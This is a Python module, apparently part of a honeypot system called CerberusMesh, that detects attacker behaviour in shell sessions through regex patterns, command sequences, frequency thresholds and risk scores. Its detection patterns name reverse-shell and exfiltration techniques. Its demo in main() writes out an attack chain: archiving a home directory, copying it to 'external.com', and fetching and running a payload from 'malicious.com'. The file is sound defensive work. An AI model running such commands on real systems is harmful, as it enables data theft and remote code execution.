#!/usr/bin/env python3
"""
CerberusMesh Tripwire - Behavioral Trigger and Flag System

This module implements advanced behavioral detection and tripwire
mechanisms that monitor attacker patterns and trigger specialized
responses or escalations.
"""

import asyncio
import json
import logging
import os
import re
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, asdict
from pathlib import Path
import uuid
from collections import defaultdict, deque

import redis
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@dataclass
class TripwireEvent:
    """Structure for tripwire trigger events."""
    event_id: str
    timestamp: datetime
    session_id: str
    tripwire_name: str
    trigger_type: str  # "pattern", "sequence", "frequency", "behavioral"
    trigger_data: Dict[str, Any]
    confidence: float
    severity: str  # "low", "medium", "high", "critical"
    metadata: Optional[Dict[str, Any]] = None

@dataclass
class BehaviorProfile:
    """Behavioral profile for session analysis."""
    session_id: str
    commands: List[Dict[str, Any]]
    patterns: Set[str]
    timestamps: List[datetime]
    sequence_analysis: Dict[str, Any]
    frequency_analysis: Dict[str, int]
    skill_indicators: List[str]
    automation_score: float
    persistence_score: float
    stealth_score: float

class CerberusTripwire:
    """Advanced behavioral detection and tripwire system."""
    
    # Command pattern definitions
    COMMAND_PATTERNS = {
        "reconnaissance": {
            "patterns": [
                r"ls\s+(-la|--all|-l)",
                r"find\s+/.*-name",
                r"locate\s+",
                r"which\s+",
                r"whereis\s+",
                r"ps\s+(-ef|aux)",
                r"netstat\s+(-an|-rn)",
                r"ss\s+(-tuln|-a)",
                r"lsof\s+",
                r"who\s*$",
                r"w\s*$",
                r"last\s*"
            ],
            "severity": "low",
            "description": "System reconnaissance activities"
        },
        
        "privilege_escalation": {
            "patterns": [
                r"sudo\s+su",
                r"su\s+-",
                r"sudo\s+(-i|--login)",
                r"passwd\s+",
                r"usermod\s+",
                r"adduser\s+",
                r"useradd\s+",
                r"visudo\s*$",
                r"chmod\s+\+s",
                r"find.*-perm.*4000",
                r"find.*-perm.*2000"
            ],
            "severity": "high",
            "description": "Privilege escalation attempts"
        },
        
        "persistence": {
            "patterns": [
                r"crontab\s+(-e|-l)",
                r"echo.*>.*\.bashrc",
                r"echo.*>.*\.profile",
                r"systemctl\s+enable",
                r"update-rc\.d\s+",
                r"chkconfig\s+",
                r"\.ssh/authorized_keys",
                r"ssh-keygen\s+",
                r"ssh-copy-id\s+"
            ],
            "severity": "high", 
            "description": "Persistence mechanism establishment"
        },
        
        "data_exfiltration": {
            "patterns": [
                r"tar\s+.*czf.*",
                r"zip\s+.*-r",
                r"scp\s+.*@",
                r"rsync\s+.*@",
                r"wget\s+.*--post-file",
                r"curl\s+.*-T",
                r"curl\s+.*--data-binary",
                r"nc\s+.*<",
                r"cat\s+.*\|\s*nc"
            ],
            "severity": "critical",
            "description": "Data exfiltration activities"
        },
        
        "network_tools": {
            "patterns": [
                r"nmap\s+",
                r"masscan\s+",
                r"zmap\s+",
                r"nc\s+(-l|-e)",
                r"socat\s+",
                r"telnet\s+",
                r"curl\s+.*://",
                r"wget\s+.*://",
                r"dig\s+",
                r"nslookup\s+"
            ],
            "severity": "medium",
            "description": "Network scanning and tools usage"
        },
        
        "malware_tools": {
            "patterns": [
                r"python\s+.*-c.*import.*socket",
                r"perl\s+.*-e.*socket",
                r"bash\s+-i\s+>&\s*/dev/tcp",
                r"sh\s+-i\s+>&\s*/dev/tcp",
                r"powershell\s+.*IEX",
                r"msfvenom\s+",
                r"meterpreter\s+",
                r"reverse_tcp\s+"
            ],
            "severity": "critical", 
            "description": "Malware and exploitation tools"
        },
        
        "anti_forensics": {
            "patterns": [
                r"history\s+-c",
                r"unset\s+HISTFILE",
                r"export\s+HISTSIZE=0",
                r"rm\s+.*\.bash_history",
                r"shred\s+",
                r"wipe\s+",
                r"dd\s+.*if=/dev/zero",
                r"find.*-exec\s+rm"
            ],
            "severity": "high",
            "description": "Anti-forensics and evidence destruction"
        }
    }
    
    # Behavioral sequence patterns
    SEQUENCE_PATTERNS = {
        "typical_recon": {
            "sequence": ["whoami", "id", "ls", "ps"],
            "window": 300,  # 5 minutes
            "severity": "low",
            "description": "Standard reconnaissance sequence"
        },
        
        "escalation_attempt": {
            "sequence": ["sudo su", "passwd", "usermod"],
            "window": 600,  # 10 minutes
            "severity": "high",
            "description": "Privilege escalation sequence"
        },
        
        "persistence_setup": {
            "sequence": ["crontab", "ssh-keygen", "authorized_keys"],
            "window": 900,  # 15 minutes
            "severity": "critical",
            "description": "Persistence establishment sequence"
        },
        
        "data_theft": {
            "sequence": ["find", "tar", "scp"],
            "window": 1200,  # 20 minutes
            "severity": "critical",
            "description": "Data theft operation sequence"
        }
    }
    
    # Frequency-based tripwires
    FREQUENCY_THRESHOLDS = {
        "command_spam": {
            "threshold": 50,
            "window": 60,  # 1 minute
            "severity": "medium",
            "description": "Excessive command frequency"
        },
        
        "login_brute": {
            "threshold": 10,
            "window": 300,  # 5 minutes
            "severity": "high", 
            "description": "Brute force login attempts"
        },
        
        "repeated_failures": {
            "threshold": 20,
            "window": 600,  # 10 minutes
            "severity": "medium",
            "description": "Repeated command failures"
        }
    }
    
    def __init__(self, config: Optional[Dict] = None):
        """Initialize the tripwire system."""
        self.config = config or self._load_config()
        self._init_redis()
        
        # Behavioral tracking
        self.session_profiles: Dict[str, BehaviorProfile] = {}
        self.active_tripwires: Dict[str, List[TripwireEvent]] = defaultdict(list)
        self.pattern_cache: Dict[str, re.Pattern] = {}
        
        # Metrics
        self.tripwires_triggered = 0
        self.patterns_detected = 0
        self.sequences_identified = 0
        
        # Compile regex patterns
        self._compile_patterns()
        
        logger.info("CerberusTripwire system initialized")
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from environment."""
        return {
            # Redis Configuration
            "redis_host": os.getenv("REDIS_HOST", "localhost"),
            "redis_port": int(os.getenv("REDIS_PORT", "6379")),
            "redis_db": int(os.getenv("REDIS_DB", "4")),
            
            # Tripwire Behavior
            "enabled": os.getenv("CERBERUS_TRIPWIRE", "true").lower() == "true",
            "sensitivity": os.getenv("CERBERUS_TRIPWIRE_SENSITIVITY", "medium"),
            "auto_escalate": os.getenv("CERBERUS_AUTO_ESCALATE", "true").lower() == "true",
            
            # Analysis Windows
            "sequence_window": int(os.getenv("CERBERUS_SEQUENCE_WINDOW", "600")),
            "frequency_window": int(os.getenv("CERBERUS_FREQUENCY_WINDOW", "300")),
            "behavior_window": int(os.getenv("CERBERUS_BEHAVIOR_WINDOW", "1800")),
            
            # Thresholds
            "automation_threshold": float(os.getenv("CERBERUS_AUTOMATION_THRESHOLD", "0.7")),
            "persistence_threshold": float(os.getenv("CERBERUS_PERSISTENCE_THRESHOLD", "0.6")),
            "stealth_threshold": float(os.getenv("CERBERUS_STEALTH_THRESHOLD", "0.8")),
        }
    
    def _init_redis(self):
        """Initialize Redis for tripwire coordination."""
        try:
            self.redis_client = redis.Redis(
                host=self.config["redis_host"],
                port=self.config["redis_port"],
                db=self.config["redis_db"],
                decode_responses=True
            )
            self.redis_client.ping()
            logger.info("Redis initialized for tripwire system")
        except Exception as e:
            logger.warning(f"Redis not available: {e}")
            self.redis_client = None
    
    def _compile_patterns(self):
        """Compile regex patterns for efficiency."""
        for category, config in self.COMMAND_PATTERNS.items():
            for pattern in config["patterns"]:
                try:
                    compiled = re.compile(pattern, re.IGNORECASE)
                    self.pattern_cache[f"{category}:{pattern}"] = compiled
                except re.error as e:
                    logger.warning(f"Invalid regex pattern {pattern}: {e}")
    
    def analyze_command(
        self, 
        session_id: str, 
        command: str, 
        metadata: Optional[Dict] = None
    ) -> List[TripwireEvent]:
        """Analyze command for tripwire triggers."""
        if not self.config["enabled"]:
            return []
        
        events = []
        
        # Update behavior profile
        self._update_behavior_profile(session_id, command, metadata)
        
        # Pattern-based detection
        pattern_events = self._detect_patterns(session_id, command)
        events.extend(pattern_events)
        
        # Sequence-based detection
        sequence_events = self._detect_sequences(session_id, command)
        events.extend(sequence_events)
        
        # Frequency-based detection
        frequency_events = self._detect_frequency_anomalies(session_id)
        events.extend(frequency_events)
        
        # Behavioral analysis
        behavior_events = self._analyze_behavior(session_id)
        events.extend(behavior_events)
        
        # Process and cache events
        for event in events:
            self._process_tripwire_event(event)
        
        return events
    
    def _update_behavior_profile(
        self, 
        session_id: str, 
        command: str, 
        metadata: Optional[Dict] = None
    ):
        """Update behavioral profile for session."""
        if session_id not in self.session_profiles:
            self.session_profiles[session_id] = BehaviorProfile(
                session_id=session_id,
                commands=[],
                patterns=set(),
                timestamps=[],
                sequence_analysis={},
                frequency_analysis=defaultdict(int),
                skill_indicators=[],
                automation_score=0.0,
                persistence_score=0.0,
                stealth_score=0.0
            )
        
        profile = self.session_profiles[session_id]
        
        # Add command to history
        command_entry = {
            "command": command,
            "timestamp": datetime.now(),
            "metadata": metadata or {}
        }
        profile.commands.append(command_entry)
        profile.timestamps.append(datetime.now())
        
        # Update frequency analysis
        cmd_base = command.split()[0] if command.split() else command
        profile.frequency_analysis[cmd_base] += 1
        
        # Analyze skill indicators
        self._analyze_skill_indicators(profile, command)
        
        # Calculate behavioral scores
        self._calculate_behavioral_scores(profile)
        
        # Trim old data
        self._trim_profile_data(profile)
    
    def _detect_patterns(self, session_id: str, command: str) -> List[TripwireEvent]:
        """Detect command pattern matches."""
        events = []
        
        for category, config in self.COMMAND_PATTERNS.items():
            for pattern in config["patterns"]:
                cache_key = f"{category}:{pattern}"
                compiled_pattern = self.pattern_cache.get(cache_key)
                
                if compiled_pattern and compiled_pattern.search(command):
                    event = TripwireEvent(
                        event_id=str(uuid.uuid4()),
                        timestamp=datetime.now(),
                        session_id=session_id,
                        tripwire_name=f"pattern_{category}",
                        trigger_type="pattern",
                        trigger_data={
                            "category": category,
                            "pattern": pattern,
                            "command": command,
                            "description": config["description"]
                        },
                        confidence=0.8,
                        severity=config["severity"]
                    )
                    events.append(event)
                    self.patterns_detected += 1
                    
                    logger.info(f"Pattern detected: {category} - {command}")
        
        return events
    
    def _detect_sequences(self, session_id: str, command: str) -> List[TripwireEvent]:
        """Detect command sequence patterns."""
        events = []
        
        if session_id not in self.session_profiles:
            return events
        
        profile = self.session_profiles[session_id]
        recent_commands = [
            cmd["command"] for cmd in profile.commands[-10:]  # Last 10 commands
        ]
        
        for seq_name, seq_config in self.SEQUENCE_PATTERNS.items():
            sequence = seq_config["sequence"]
            window = seq_config["window"]
            
            # Check if sequence is present in recent commands
            if self._is_sequence_present(recent_commands, sequence, profile.timestamps, window):
                event = TripwireEvent(
                    event_id=str(uuid.uuid4()),
                    timestamp=datetime.now(),
                    session_id=session_id,
                    tripwire_name=f"sequence_{seq_name}",
                    trigger_type="sequence",
                    trigger_data={
                        "sequence_name": seq_name,
                        "sequence": sequence,
                        "recent_commands": recent_commands[-len(sequence):],
                        "description": seq_config["description"]
                    },
                    confidence=0.9,
                    severity=seq_config["severity"]
                )
                events.append(event)
                self.sequences_identified += 1
                
                logger.warning(f"Sequence detected: {seq_name} - {session_id}")
        
        return events
    
    def _is_sequence_present(
        self, 
        commands: List[str], 
        sequence: List[str], 
        timestamps: List[datetime], 
        window: int
    ) -> bool:
        """Check if command sequence is present within time window."""
        if len(commands) < len(sequence):
            return False
        
        # Check sequence match with reduced complexity
        for i in range(len(commands) - len(sequence) + 1):
            if self._check_sequence_match(commands, sequence, i, timestamps, window):
                return True
        
        return False
    
    def _check_sequence_match(
        self, 
        commands: List[str], 
        sequence: List[str], 
        start_idx: int,
        timestamps: List[datetime], 
        window: int
    ) -> bool:
        """Check if sequence matches at given position."""
        match_count = 0
        for j, seq_cmd in enumerate(sequence):
            if seq_cmd.lower() in commands[start_idx + j].lower():
                match_count += 1
        
        # If we found all sequence commands, check timing
        if match_count == len(sequence) and len(timestamps) > start_idx + len(sequence) - 1:
            time_diff = (timestamps[start_idx + len(sequence) - 1] - timestamps[start_idx]).total_seconds()
            return time_diff <= window
            
        return False
    
    def _detect_frequency_anomalies(self, session_id: str) -> List[TripwireEvent]:
        """Detect frequency-based anomalies."""
        events = []
        
        if session_id not in self.session_profiles:
            return events
        
        profile = self.session_profiles[session_id]
        current_time = datetime.now()
        
        for freq_name, freq_config in self.FREQUENCY_THRESHOLDS.items():
            threshold = freq_config["threshold"]
            window = freq_config["window"]
            
            # Count commands in time window
            window_start = current_time - timedelta(seconds=window)
            recent_commands = [
                cmd for cmd in profile.commands
                if cmd["timestamp"] >= window_start
            ]
            
            if len(recent_commands) >= threshold:
                event = TripwireEvent(
                    event_id=str(uuid.uuid4()),
                    timestamp=datetime.now(),
                    session_id=session_id,
                    tripwire_name=f"frequency_{freq_name}",
                    trigger_type="frequency",
                    trigger_data={
                        "frequency_name": freq_name,
                        "command_count": len(recent_commands),
                        "threshold": threshold,
                        "window": window,
                        "description": freq_config["description"]
                    },
                    confidence=0.7,
                    severity=freq_config["severity"]
                )
                events.append(event)
                
                logger.warning(f"Frequency anomaly: {freq_name} - {session_id}")
        
        return events
    
    def _analyze_behavior(self, session_id: str) -> List[TripwireEvent]:
        """Analyze overall behavioral patterns."""
        events = []
        
        if session_id not in self.session_profiles:
            return events
        
        profile = self.session_profiles[session_id]
        
        # Check automation score
        if profile.automation_score >= self.config["automation_threshold"]:
            events.append(TripwireEvent(
                event_id=str(uuid.uuid4()),
                timestamp=datetime.now(),
                session_id=session_id,
                tripwire_name="high_automation",
                trigger_type="behavioral",
                trigger_data={
                    "automation_score": profile.automation_score,
                    "indicators": profile.skill_indicators,
                    "description": "High automation detected in session"
                },
                confidence=profile.automation_score,
                severity="medium"
            ))
        
        # Check persistence indicators
        if profile.persistence_score >= self.config["persistence_threshold"]:
            events.append(TripwireEvent(
                event_id=str(uuid.uuid4()),
                timestamp=datetime.now(),
                session_id=session_id,
                tripwire_name="persistence_indicators",
                trigger_type="behavioral",
                trigger_data={
                    "persistence_score": profile.persistence_score,
                    "indicators": profile.skill_indicators,
                    "description": "Persistence establishment detected"
                },
                confidence=profile.persistence_score,
                severity="high"
            ))
        
        # Check stealth indicators
        if profile.stealth_score >= self.config["stealth_threshold"]:
            events.append(TripwireEvent(
                event_id=str(uuid.uuid4()),
                timestamp=datetime.now(),
                session_id=session_id,
                tripwire_name="stealth_behavior",
                trigger_type="behavioral",
                trigger_data={
                    "stealth_score": profile.stealth_score,
                    "indicators": profile.skill_indicators,
                    "description": "Stealth behavior patterns detected"
                },
                confidence=profile.stealth_score,
                severity="high"
            ))
        
        return events
    
    def _analyze_skill_indicators(self, profile: BehaviorProfile, command: str):
        """Analyze command for skill level indicators."""
        skill_indicators = []
        
        # Advanced command usage
        advanced_patterns = [
            r"awk\s+",
            r"sed\s+",
            r"grep\s+-[A-Za-z]*E",  # Extended regex
            r"find.*-exec",
            r"xargs\s+",
            r"while.*do.*done",
            r"for.*in.*do.*done"
        ]
        
        for pattern in advanced_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                skill_indicators.append("advanced_command_usage")
                break
        
        # System knowledge
        system_patterns = [
            r"/proc/",
            r"/sys/",
            r"/dev/",
            r"systemctl",
            r"journalctl",
            r"systemd"
        ]
        
        for pattern in system_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                skill_indicators.append("system_knowledge")
                break
        
        # Stealth techniques
        stealth_patterns = [
            r"history\s+-c",
            r"unset.*HIST",
            r"export.*HIST.*=0",
            r">/dev/null\s+2>&1",
            r"nohup\s+.*&"
        ]
        
        for pattern in stealth_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                skill_indicators.append("stealth_techniques")
                break
        
        profile.skill_indicators.extend(skill_indicators)
    
    def _calculate_behavioral_scores(self, profile: BehaviorProfile):
        """Calculate behavioral risk scores."""
        # Automation score based on timing patterns
        if len(profile.timestamps) >= 2:
            intervals = []
            for i in range(1, len(profile.timestamps)):
                interval = (profile.timestamps[i] - profile.timestamps[i-1]).total_seconds()
                intervals.append(interval)
            
            # Consistent timing suggests automation
            if intervals:
                avg_interval = sum(intervals) / len(intervals)
                variance = sum((x - avg_interval) ** 2 for x in intervals) / len(intervals)
                coefficient_of_variation = (variance ** 0.5) / avg_interval if avg_interval > 0 else 1
                
                # Lower variation = higher automation score
                profile.automation_score = max(0, 1 - coefficient_of_variation)
        
        # Persistence score based on commands
        persistence_commands = ["crontab", "ssh-keygen", "authorized_keys", "systemctl", "usermod"]
        persistence_count = sum(
            1 for cmd in profile.commands
            if any(p in cmd["command"].lower() for p in persistence_commands)
        )
        profile.persistence_score = min(1.0, persistence_count / 5)
        
        # Stealth score based on indicators
        stealth_indicators = ["stealth_techniques", "anti_forensics"]
        stealth_count = sum(
            1 for indicator in profile.skill_indicators
            if indicator in stealth_indicators
        )
        profile.stealth_score = min(1.0, stealth_count / 3)
    
    def _trim_profile_data(self, profile: BehaviorProfile):
        """Trim old data from behavioral profile."""
        max_commands = 100
        max_age = timedelta(hours=2)
        current_time = datetime.now()
        
        # Trim by count
        if len(profile.commands) > max_commands:
            profile.commands = profile.commands[-max_commands:]
            profile.timestamps = profile.timestamps[-max_commands:]
        
        # Trim by age
        cutoff_time = current_time - max_age
        profile.commands = [
            cmd for cmd in profile.commands
            if cmd["timestamp"] >= cutoff_time
        ]
        profile.timestamps = [
            ts for ts in profile.timestamps
            if ts >= cutoff_time
        ]
    
    def _process_tripwire_event(self, event: TripwireEvent):
        """Process and handle tripwire event."""
        self.tripwires_triggered += 1
        
        # Add to active tripwires
        self.active_tripwires[event.session_id].append(event)
        
        # Log event
        logger.warning(f"TRIPWIRE TRIGGERED: {event.tripwire_name} - {event.session_id}")
        
        # Cache event
        if self.redis_client:
            try:
                event_data = asdict(event)
                event_key = f"tripwire_event:{event.session_id}:{event.event_id}"
                self.redis_client.setex(event_key, 86400, json.dumps(event_data, default=str))
            except Exception as e:
                logger.error(f"Failed to cache tripwire event: {e}")
        
        # Auto-escalate if configured
        if (self.config["auto_escalate"] and 
            event.severity in ["high", "critical"] and 
            event.confidence >= 0.8):
            self._escalate_event(event)
    
    def _escalate_event(self, event: TripwireEvent):
        """Escalate high-priority tripwire event."""
        escalation_data = {
            "event_id": event.event_id,
            "session_id": event.session_id,
            "tripwire_name": event.tripwire_name,
            "severity": event.severity,
            "confidence": event.confidence,
            "trigger_data": event.trigger_data,
            "timestamp": event.timestamp.isoformat(),
            "escalation_reason": "auto_escalation_high_severity"
        }
        
        logger.critical(f"TRIPWIRE ESCALATION: {escalation_data}")
        
        # Cache escalation
        if self.redis_client:
            try:
                escalation_key = f"tripwire_escalation:{event.session_id}:{event.event_id}"
                self.redis_client.setex(escalation_key, 86400, json.dumps(escalation_data))
            except Exception as e:
                logger.error(f"Failed to cache escalation: {e}")
    
    def get_session_risk_score(self, session_id: str) -> float:
        """Calculate overall risk score for session."""
        if session_id not in self.session_profiles:
            return 0.0
        
        profile = self.session_profiles[session_id]
        active_events = self.active_tripwires.get(session_id, [])
        
        # Base score from behavioral analysis
        base_score = (
            profile.automation_score * 0.2 +
            profile.persistence_score * 0.4 +
            profile.stealth_score * 0.3
        )
        
        # Additional score from active tripwires
        event_score = 0.0
        if active_events:
            severity_weights = {"low": 0.1, "medium": 0.3, "high": 0.6, "critical": 1.0}
            event_score = sum(
                severity_weights.get(event.severity, 0.5) * event.confidence
                for event in active_events[-5:]  # Last 5 events
            ) / len(active_events[-5:])
        
        # Combine scores
        final_score = min(1.0, base_score + event_score)
        return final_score
    
    def get_tripwire_stats(self) -> Dict[str, Any]:
        """Get tripwire system statistics."""
        return {
            "tripwires_triggered": self.tripwires_triggered,
            "patterns_detected": self.patterns_detected,
            "sequences_identified": self.sequences_identified,
            "active_sessions": len(self.session_profiles),
            "active_tripwires": sum(len(events) for events in self.active_tripwires.values()),
            "config": self.config
        }
    
    def get_session_analysis(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get detailed analysis for specific session."""
        if session_id not in self.session_profiles:
            return None
        
        profile = self.session_profiles[session_id]
        events = self.active_tripwires.get(session_id, [])
        
        return {
            "session_id": session_id,
            "risk_score": self.get_session_risk_score(session_id),
            "command_count": len(profile.commands),
            "skill_indicators": list(set(profile.skill_indicators)),
            "automation_score": profile.automation_score,
            "persistence_score": profile.persistence_score,
            "stealth_score": profile.stealth_score,
            "active_tripwires": len(events),
            "recent_events": [asdict(event) for event in events[-5:]],
            "frequency_analysis": dict(profile.frequency_analysis)
        }
    
    def cleanup_expired_data(self):
        """Clean up expired session data."""
        current_time = datetime.now()
        expired_sessions = []
        
        for session_id, profile in self.session_profiles.items():
            if profile.timestamps:
                last_activity = max(profile.timestamps)
                if (current_time - last_activity).total_seconds() > 3600:  # 1 hour
                    expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            logger.info(f"Cleaning up expired tripwire data: {session_id}")
            del self.session_profiles[session_id]
            if session_id in self.active_tripwires:
                del self.active_tripwires[session_id]

# Integration with other CerberusMesh components
def integrate_with_engagement_engine(tripwire: CerberusTripwire, session_id: str, command: str):
    """Integration point with engagement engine."""
    events = tripwire.analyze_command(session_id, command)
    
    # Return events for potential engagement rule adjustments
    return events

def main():
    """Demo/test function for CerberusTripwire."""
    tripwire = CerberusTripwire()
    
    # Demo session
    session_id = "demo_tripwire_session"
    
    # Demo commands that should trigger various tripwires
    demo_commands = [
        "whoami",
        "id", 
        "ls -la",
        "ps aux",
        "sudo su -",
        "find / -name '*.conf'",
        "crontab -e",
        "ssh-keygen -t rsa",
        "tar czf /tmp/data.tar.gz /home/user/",
        "scp data.tar.gz user@external.com:/tmp/",
        "history -c",
        "wget http://malicious.com/payload.sh",
        "chmod +x payload.sh",
        "./payload.sh"
    ]
    
    print(f"Analyzing commands for session: {session_id}")
    
    for command in demo_commands:
        print(f"\nCommand: {command}")
        events = tripwire.analyze_command(session_id, command)
        
        for event in events:
            print(f"  TRIPWIRE: {event.tripwire_name} ({event.severity}) - {event.trigger_data.get('description', '')}")
        
        if not events:
            print("  No tripwires triggered")
    
    # Show session analysis
    analysis = tripwire.get_session_analysis(session_id)
    if analysis:
        print("\nSession Analysis:")
        print(f"  Risk Score: {analysis['risk_score']:.2f}")
        print(f"  Commands: {analysis['command_count']}")
        print(f"  Skill Indicators: {analysis['skill_indicators']}")
        print(f"  Automation Score: {analysis['automation_score']:.2f}")
        print(f"  Persistence Score: {analysis['persistence_score']:.2f}")
        print(f"  Stealth Score: {analysis['stealth_score']:.2f}")
    
    # Show statistics
    stats = tripwire.get_tripwire_stats()
    print(f"\nTripwire Statistics: {stats}")

if __name__ == "__main__":
    main()
